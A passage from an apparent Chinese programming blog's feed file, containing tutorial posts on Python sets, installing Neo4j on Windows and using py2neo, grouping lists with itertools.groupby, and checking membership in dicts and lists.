        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引言"><a class="markdownIt-Anchor" href="#1-引言"></a> 1 引言</h1><p>集合（set）是一个无序的不重复元素序列。</p><p>主要copy于<a href="https://www.runoob.com/python3/python3-set.html" target="_blank" rel="noopener">菜鸟教程</a></p><h1 id="2-使用"><a class="markdownIt-Anchor" href="#2-使用"></a> 2 使用</h1><h2 id="21-创建"><a class="markdownIt-Anchor" href="#21-创建"></a> 2.1 创建</h2><p>可以使用大括号 <strong>{ }</strong> 或者 <strong>set()</strong> 函数创建集合：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">set1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">print(set1)  <span class="comment"># &#123;1, 2, 3&#125;</span></span><br><span class="line"></span><br><span class="line">set2 = &#123;<span class="string">'pear'</span>, <span class="string">'apple'</span>&#125;</span><br><span class="line">print(set2)  <span class="comment"># &#123;'apple', 'pear'&#125;</span></span><br><span class="line"></span><br><span class="line">set3 = set(<span class="string">"apple"</span>)</span><br><span class="line">print(set3)  <span class="comment"># &#123;'l', 'p', 'e', 'a'&#125;</span></span><br><span class="line"></span><br><span class="line">set4 = set(&#123;<span class="string">'pear'</span>, <span class="string">'apple'</span>&#125;)</span><br><span class="line">print(set4)  <span class="comment"># &#123;'apple', 'pear'&#125;</span></span><br><span class="line"></span><br><span class="line">set5 = set((<span class="string">'pear'</span>, <span class="string">'apple'</span>))</span><br><span class="line">print(set5)  <span class="comment"># &#123;'pear', 'apple'&#125;</span></span><br></pre></td></tr></table></figure><p><font color="red">注意：创建一个空集合必须用 <strong>set()</strong> 而不是 <strong>{ }</strong>，因为 <strong>{ }</strong> 是用来创建一个空字典。</font></p><h2 id="22-集合运算"><a class="markdownIt-Anchor" href="#22-集合运算"></a> 2.2 集合运算</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># 下面展示两个集合间的运算.</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = set(<span class="string">'abracadabra'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = set(<span class="string">'alacazam'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a                                  </span><br><span class="line">&#123;<span class="string">'a'</span>, <span class="string">'r'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a - b                              <span class="comment"># 集合a中包含而集合b中不包含的元素</span></span><br><span class="line">&#123;<span class="string">'r'</span>, <span class="string">'d'</span>, <span class="string">'b'</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a | b                              <span class="comment"># 集合a或b中包含的所有元素</span></span><br><span class="line">&#123;<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'r'</span>, <span class="string">'d'</span>, <span class="string">'b'</span>, <span class="string">'m'</span>, <span class="string">'z'</span>, <span class="string">'l'</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a &amp; b                              <span class="comment"># 集合a和b中都包含了的元素</span></span><br><span class="line">&#123;<span class="string">'a'</span>, <span class="string">'c'</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a ^ b                              <span class="comment"># 不同时包含于a和b的元素</span></span><br><span class="line">&#123;<span class="string">'r'</span>, <span class="string">'d'</span>, <span class="string">'b'</span>, <span class="string">'m'</span>, <span class="string">'z'</span>, <span class="string">'l'</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="23-基本操作"><a class="markdownIt-Anchor" href="#23-基本操作"></a> 2.3 基本操作</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">test_set = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line"><span class="comment"># 添加元素——add(x)</span></span><br><span class="line"><span class="comment">##将元素 x 添加到集合 s 中，如果元素已存在，则不进行任何操作。</span></span><br><span class="line">test_set.add(<span class="number">2</span>)  <span class="comment"># &#123;1, 2&#125;</span></span><br><span class="line">test_set.add(<span class="number">3</span>)  <span class="comment"># &#123;1, 2, 3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加元素——update(x)</span></span><br><span class="line"><span class="comment">##参数是列表，元组，字典等，int会报错</span></span><br><span class="line"><span class="comment">##x 可以有多个，用逗号分开。</span></span><br><span class="line">test_set.update(<span class="number">4</span>)  <span class="comment"># TypeError: 'int' object is not iterable</span></span><br><span class="line">test_set.update(&#123;<span class="number">4</span>, <span class="number">5</span>&#125;)  <span class="comment"># &#123;1, 2, 3, 4, 5&#125;</span></span><br><span class="line">test_set.update([<span class="number">4</span>, <span class="number">5</span>], [<span class="number">5</span>, <span class="number">6</span>])  <span class="comment"># &#123;1, 2, 3, 4, 5, 6&#125;</span></span><br><span class="line">test_set.update((<span class="number">6</span>, <span class="number">7</span>))  <span class="comment"># &#123;1, 2, 3, 4, 5, 6, 7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除元素——remove(x)</span></span><br><span class="line"><span class="comment">##将元素 x 从集合 s 中移除，如果元素不存在，则会发生错误。</span></span><br><span class="line">test_set.remove(<span class="number">8</span>)  <span class="comment"># KeyError: 8</span></span><br><span class="line">test_set.remove(<span class="number">7</span>)  <span class="comment"># &#123;1, 2, 3, 4, 5, 6&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除元素——discard(x)</span></span><br><span class="line"><span class="comment">##移除集合中的元素，且如果元素不存在，不会发生错误</span></span><br><span class="line">test_set.discard(<span class="number">7</span>)  <span class="comment"># 不报错 &#123;1, 2, 3, 4, 5, 6&#125;</span></span><br><span class="line">test_set.discard(<span class="number">6</span>)  <span class="comment"># &#123;1, 2, 3, 4, 5&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除元素——pop()</span></span><br><span class="line"><span class="comment">##随机删除集合中的一个元素</span></span><br><span class="line"><span class="comment">##对集合进行无序的排列，然后将这个无序排列集合的左面第一个元素进行删除。</span></span><br><span class="line">test_set.pop()  <span class="comment"># &#123;2, 3, 4, 5&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算元素个数——len</span></span><br><span class="line">len(test_set)  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断元素是否存在于集合中——in</span></span><br><span class="line">print(<span class="number">2</span> <span class="keyword">in</span> test_set)  <span class="comment"># True</span></span><br><span class="line">print(<span class="number">1</span> <span class="keyword">in</span> test_set)  <span class="comment"># False</span></span><br><span class="line">print(<span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> test_set)  <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空集合——clear</span></span><br><span class="line">test_set.clear()</span><br><span class="line">print(test_set)  <span class="comment"># set()</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows下安装与使用neo4j</title>
      <link href="/2022/02/10/Windows%E4%B8%8B%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8neo4j/"/>
      <url>/2022/02/10/Windows%E4%B8%8B%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8neo4j/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引言"><a class="markdownIt-Anchor" href="#1-引言"></a> 1 引言</h1><p>最近在实现恶意样本行为可视化，使用 <a href="dragonliu.tk/2022/02/03/python%E6%A8%A1%E5%9D%97graphviz%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">python模块graphviz使用教程</a> 可以达到既定要求；但是图数据库neo4j理论上也是个不错的选择，所以整理下。</p><p>思路：安装Neo4j数据库，python语言使用py2neo库进行使用。</p><h1 id="2-安装neo4j"><a class="markdownIt-Anchor" href="#2-安装neo4j"></a> 2 安装Neo4j</h1><p>主要copy于 <a href="https://cloud.tencent.com/developer/article/1387732" target="_blank" rel="noopener">图数据库neo4j的安装与基本使用(一)</a></p><h2 id="21-安装jdk"><a class="markdownIt-Anchor" href="#21-安装jdk"></a> 2.1 安装JDK</h2><p>Neo4j是基于Java的图形<a href="https://cloud.tencent.com/solution/database?from=10680" target="_blank" rel="noopener">数据库</a>，运行Neo4j需要启动JVM进程，因此必须安装JAVA SE的JDK。从Oracle官方网站下载 <a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">Java SE JDK</a>，当前的版本是JDK8。<font color="red">java版本的高低决定了Neo4j的版本</font></p><h2 id="22-安装neo4j"><a class="markdownIt-Anchor" href="#22-安装neo4j"></a> 2.2 安装Neo4j</h2><p>官网下载最新版本<a href="https://neo4j.com/download/other-releases/" target="_blank" rel="noopener">Neo4j</a></p><p>Neo4j应用程序有如下主要的目录结构：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bin目录：用于存储Neo4j的可执行程序；</span><br><span class="line">conf目录：用于控制Neo4j启动的配置文件；</span><br><span class="line">data目录：用于存储核心数据库文件；</span><br><span class="line">plugins目录：用于存储Neo4j的插件；</span><br></pre></td></tr></table></figure><h2 id="23-配置环境变量"><a class="markdownIt-Anchor" href="#23-配置环境变量"></a> 2.3 配置环境变量</h2><p>创建主目录环境变量NEO4J_HOME，并把主目录设置为变量值。</p><img src="https://s2.loli.net/2022/02/11/lkopux9h8Zn7PeE.png" width="600" height="200" alt="图片名称" align="center" id="72"><h2 id="24-启动neo4j"><a class="markdownIt-Anchor" href="#24-启动neo4j"></a> 2.4 启动neo4j</h2><h3 id="241-通过控制台启动neo4j程序"><a class="markdownIt-Anchor" href="#241-通过控制台启动neo4j程序"></a> 2.4.1 通过控制台启动Neo4j程序</h3><p>打开cmd，切换到Neo4j主目录下的<code>bin</code>目录，运行下面命令即可：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j.bat console</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/02/11/3d7LJMoKpr2WxNC.png" width="800" height="200" alt="图片名称" align="center" id="73"><img src="https://s2.loli.net/2022/02/11/nFHPDW9Tfxz6LXY.png" width="600" height="300" alt="图片名称" align="center" id="74"><p>用户名和密码默认为<code>neo4j</code>，首次登陆需要修改密码(Neo4j)</p><p><font color="red">java与neo4j版本不对应的报错：</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">警告: ERROR! Neo4j cannot be started using java version <span class="number">1.8</span><span class="number">.0</span>_301</span><br><span class="line">警告: * Please use Oracle(R) Java(TM) <span class="number">11</span>, OpenJDK(TM) <span class="number">11</span> to run Neo4j Server.</span><br><span class="line">* Please see https://neo4j.com/docs/ <span class="keyword">for</span> Neo4j installation instructions.</span><br><span class="line">Invoke-Neo4j : This instance of Java <span class="keyword">is</span> <span class="keyword">not</span> supported</span><br><span class="line">所在位置 D:\developer\neo4j\neo4j-community<span class="number">-4.4</span><span class="number">.3</span>\bin\neo4j.ps1:<span class="number">21</span> 字符: <span class="number">7</span></span><br><span class="line">+ Exit (Invoke-Neo4j -Verbose:$Arguments.Verbose -CommandArgs $Argument ...</span><br><span class="line">+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException</span><br><span class="line">    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-Neo4j</span><br></pre></td></tr></table></figure><p>当时我测试的版本(JDK8+Neo4j4.4.4)出现上面的报错，该换JDK8+Neo4j3.5.30后成功运行。</p><h3 id="242-把neo4j安装为服务windows-services"><a class="markdownIt-Anchor" href="#242-把neo4j安装为服务windows-services"></a> 2.4.2 把Neo4j安装为服务（Windows Services）</h3><p>请查阅  <a href="https://cloud.tencent.com/developer/article/1387732" target="_blank" rel="noopener">图数据库neo4j的安装与基本使用(一)</a></p><h1 id="3-python使用"><a class="markdownIt-Anchor" href="#3-python使用"></a> 3 python使用</h1><p>python通过调用<code>py2neo</code> 库实现对数据库的操作。</p><ul><li><p><a href="https://py2neo.org/v4/data.html#node-and-relationship-objects" target="_blank" rel="noopener">py2neo官网</a></p></li><li><p><a href="https://www.jianshu.com/p/a2497a33390f" target="_blank" rel="noopener">py2neo——Neo4j&amp;python的配合使用</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1693445" target="_blank" rel="noopener">用Python中的py2neo库调用neo4j，搭建简单关联图谱</a></p></li></ul><h2 id="31-连接数据库"><a class="markdownIt-Anchor" href="#31-连接数据库"></a> 3.1 连接数据库</h2><p>安装py2neo库：<code>pip install py2neo</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> py2neo <span class="keyword">import</span> Graph</span><br><span class="line"></span><br><span class="line">test_graph = Graph(</span><br><span class="line">    <span class="string">"http://localhost:7474"</span>,</span><br><span class="line">    username=<span class="string">"neo4j"</span>,</span><br><span class="line">    password=<span class="string">"Neo4j"</span>  <span class="comment">#修改后的密码</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>测试时出现报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ValueError: The following settings are not supported: &#123;<span class="string">'username'</span>: <span class="string">'neo4j'</span>&#125;</span><br></pre></td></tr></table></figure><p>因为py2neo版本问题，需要做出以下修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> py2neo <span class="keyword">import</span> Graph</span><br><span class="line"></span><br><span class="line">test_graph = Graph(<span class="string">"http://localhost:7474"</span>, auth=(<span class="string">"neo4j"</span>, <span class="string">"Neo4j"</span>))</span><br></pre></td></tr></table></figure><p>详见 <a href="https://blog.csdn.net/u010785550/article/details/116856031" target="_blank" rel="noopener">关于使用Py2neo连接Neo4j图数据库出现“ValueError: The following settings are not supported”报错的解决方案</a></p><h2 id="32-基本操作"><a class="markdownIt-Anchor" href="#32-基本操作"></a> 3.2 基本操作</h2><p>参考：<a href="https://blog.csdn.net/michaelguangg/article/details/100704303" target="_blank" rel="noopener">py2neo在已有节点上批量创建关系</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> py2neo <span class="keyword">import</span> Graph, Node, Relationship, Subgraph</span><br><span class="line"></span><br><span class="line">test_graph = Graph(<span class="string">"http://localhost:7474"</span>, auth=(<span class="string">"neo4j"</span>, <span class="string">"Neo4j"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除数据库中以往的图，确保在一个空白的环境中进行操作</span></span><br><span class="line">test_graph.delete_all()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建顶点</span></span><br><span class="line">node_list = []</span><br><span class="line">node_list.append(Node(<span class="string">"Teacher"</span>, name=<span class="string">"Alice"</span>))  <span class="comment"># label(type) name(显示值)</span></span><br><span class="line">node_list.append(Node(<span class="string">"Student"</span>, name=<span class="string">"Bob"</span>))</span><br><span class="line">node_list.append(Node(<span class="string">"Student"</span>, name=<span class="string">"Dragon"</span>))</span><br><span class="line">node_list.append(Node(<span class="string">"Student"</span>, name=<span class="string">"Pig"</span>))</span><br><span class="line"><span class="comment">##subgraph加快导入速度</span></span><br><span class="line">nodes = Subgraph(node_list)</span><br><span class="line">test_graph.create(nodes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建边</span></span><br><span class="line">edge_list = []</span><br><span class="line"><span class="comment">##找到对应节点</span></span><br><span class="line">node1 = test_graph.nodes.match(name=<span class="string">"Alice"</span>).first()</span><br><span class="line">node2 = test_graph.nodes.match(name=<span class="string">"Bob"</span>).first()</span><br><span class="line">edge_list.append(Relationship(node1, <span class="string">"teach"</span>, node2))</span><br><span class="line">node1 = test_graph.nodes.match(name=<span class="string">"Alice"</span>).first()</span><br><span class="line">node2 = test_graph.nodes.match(name=<span class="string">"Dragon"</span>).first()</span><br><span class="line">edge_list.append(Relationship(node1, <span class="string">"teach"</span>, node2))</span><br><span class="line">edges = Subgraph(relationships=edge_list)</span><br><span class="line">test_graph.create(edges)</span><br></pre></td></tr></table></figure><p>效果图如下：</p><img src="https://s2.loli.net/2022/02/11/4Li9RKwmuN7t6kV.png" width="700" height="400" alt="图片名称" align="center" id="75"><h1 id="4-拓展spade"><a class="markdownIt-Anchor" href="#4-拓展spade"></a> 4 拓展——SPADE</h1><p>当时参加A-ST竞赛时使用过，本次测试没进行。</p><p><a href="https://github.com/ashish-gehani/SPADE" target="_blank" rel="noopener">Github-Spade</a></p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> neo4j </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-列表-分组</title>
      <link href="/2022/02/10/Python-%E5%88%97%E8%A1%A8-%E5%88%86%E7%BB%84/"/>
      <url>/2022/02/10/Python-%E5%88%97%E8%A1%A8-%E5%88%86%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p>最近在整python多线程，需要对文件列表进行分组，下面整理下有关list分组的内容。</p><h1 id="2-分块"><a class="markdownIt-Anchor" href="#2-分块"></a> 2 分块</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">3</span></span><br><span class="line">data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">group_data = [data[i:i + num] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data), num)]</span><br><span class="line">print(group_data)  <span class="comment"># [[1, 2, 3], [4, 5, 6], [7, 8, 9], [10]]</span></span><br></pre></td></tr></table></figure><h1 id="3-groupby分组"><a class="markdownIt-Anchor" href="#3-groupby分组"></a> 3 groupby分组</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> groupby</span><br><span class="line"></span><br><span class="line">user_list = [</span><br><span class="line">    &#123;<span class="string">"uid"</span>: <span class="number">1</span>, <span class="string">"sex"</span>: <span class="string">"男"</span>, <span class="string">"age"</span>: <span class="number">10</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"uid"</span>: <span class="number">3</span>, <span class="string">"sex"</span>: <span class="string">"男"</span>, <span class="string">"age"</span>: <span class="number">20</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"uid"</span>: <span class="number">4</span>, <span class="string">"sex"</span>: <span class="string">"女"</span>, <span class="string">"age"</span>: <span class="number">20</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"uid"</span>: <span class="number">4</span>, <span class="string">"sex"</span>: <span class="string">"女"</span>, <span class="string">"age"</span>: <span class="number">31</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"uid"</span>: <span class="number">2</span>, <span class="string">"sex"</span>: <span class="string">"男"</span>, <span class="string">"age"</span>: <span class="number">10</span>&#125;</span><br><span class="line">]</span><br><span class="line"><span class="comment"># 多字段排序</span></span><br><span class="line">user_sort = sorted(user_list, key=<span class="keyword">lambda</span> x: (x[<span class="string">"sex"</span>], x[<span class="string">"age"</span>]))</span><br><span class="line"><span class="comment"># 多字段分组</span></span><br><span class="line">user_group = groupby(user_sort, key=<span class="keyword">lambda</span> x: (x[<span class="string">"sex"</span>], x[<span class="string">"age"</span>]))</span><br><span class="line"><span class="keyword">for</span> key, group <span class="keyword">in</span> user_group:</span><br><span class="line">    print(key, list(group))</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">('女', 20) [&#123;'uid': 4, 'sex': '女', 'age': 20&#125;]</span></span><br><span class="line"><span class="string">('女', 31) [&#123;'uid': 4, 'sex': '女', 'age': 31&#125;]</span></span><br><span class="line"><span class="string">('男', 10) [&#123;'uid': 1, 'sex': '男', 'age': 10&#125;, &#123;'uid': 2, 'sex': '男', 'age': 10&#125;]</span></span><br><span class="line"><span class="string">('男', 20) [&#123;'uid': 3, 'sex': '男', 'age': 20&#125;]</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p><font color="red">注意分组之前应先使用分组字段排好序。</font></p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/qq_21570029/article/details/84062979" target="_blank" rel="noopener">python list按规定的范围分组</a></li><li><a href="https://blog.csdn.net/xiaoc100200/article/details/111402566" target="_blank" rel="noopener">Python list列表groupby分组用法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-字典-判断dict或list中是否含有某个元素或key</title>
      <link href="/2022/02/09/Python-%E5%AD%97%E5%85%B8-%E5%88%A4%E6%96%ADdict%E6%88%96list%E4%B8%AD%E6%98%AF%E5%90%A6%E5%90%AB%E6%9C%89%E6%9F%90%E4%B8%AA%E5%85%83%E7%B4%A0%E6%88%96key/"/>
      <url>/2022/02/09/Python-%E5%AD%97%E5%85%B8-%E5%88%A4%E6%96%ADdict%E6%88%96list%E4%B8%AD%E6%98%AF%E5%90%A6%E5%90%AB%E6%9C%89%E6%9F%90%E4%B8%AA%E5%85%83%E7%B4%A0%E6%88%96key/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-自带函数has_key"><a class="markdownIt-Anchor" href="#1-自带函数has_key"></a> 1 自带函数has_key()</h1><p>在python的字典的属性方法里面有一个<code>has_key()</code>方法，这个方法使用起来非常简单。</p><p>Python 3.x不再支持 <code>has_key()</code> 函数，而被<code>__contains__()</code>所替代。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">'name'</span>: &#123;&#125;, <span class="string">'age'</span>: &#123;&#125;, <span class="string">'sex'</span>: &#123;&#125;&#125;</span><br><span class="line"><span class="comment"># print(d.has_key('name'))</span></span><br><span class="line">print(d.__contains__(<span class="string">'name'</span>))  <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h1 id="2-in-方法"><a class="markdownIt-Anchor" href="#2-in-方法"></a> 2 in 方法</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字典是否含有key</span></span><br><span class="line">d = &#123;<span class="string">'name'</span>: &#123;&#125;, <span class="string">'age'</span>: &#123;&#125;, <span class="string">'sex'</span>: &#123;&#125;&#125;</span><br><span class="line">print(<span class="string">"name"</span> <span class="keyword">in</span> d.keys())  <span class="comment"># True</span></span><br><span class="line">print(<span class="string">"name"</span> <span class="keyword">not</span> <span class="keyword">in</span> d.keys())  <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表是否含有value</span></span><br><span class="line">l = [<span class="string">'name'</span>, <span class="string">'age'</span>, <span class="string">'sex'</span>]</span><br><span class="line">print(<span class="string">"name"</span> <span class="keyword">in</span> l)  <span class="comment"># True</span></span><br><span class="line">print(<span class="string">"name"</span> <span class="keyword">not</span> <span class="keyword">in</span> l)  <span class="comment"># False</span></span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/linjpg/article/details/82190565" target="_blank" rel="noopener">判断python字典或者列表中是否包含某个元素或者key</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-字符串-去除首尾的指定字符</title>
      <link href="/2022/02/09/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%8E%BB%E9%99%A4%E9%A6%96%E5%B0%BE%E7%9A%84%E6%8C%87%E5%AE%9A%E5%AD%97%E7%AC%A6/"/>
      <url>/2022/02/09/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%8E%BB%E9%99%A4%E9%A6%96%E5%B0%BE%E7%9A%84%E6%8C%87%E5%AE%9A%E5%AD%97%E7%AC%A6/</url>
      
